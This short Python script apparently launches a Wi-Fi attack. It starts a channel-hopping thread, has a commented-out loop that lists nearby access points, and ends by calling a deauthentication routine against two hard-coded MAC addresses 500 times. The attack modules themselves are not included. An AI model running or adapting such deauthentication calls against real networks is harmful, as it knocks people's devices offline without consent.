from NetworkController import NetworkController
from AttackAgent import AttackAgent
import time
import _thread

nc = NetworkController()

_thread.start_new_thread(nc.channel_hopper, ())
print('here')

# while True:
#     aps = nc.access_points
#     for key in aps:
#         print('AP: ', aps[key].bssid, aps[key].ssid, aps[key].channel)
#     time.sleep(0.5)

AttackAgent().deauth("18:64:72:63:FD:E2", "20:C9:D0:47:DD:B1", 500)


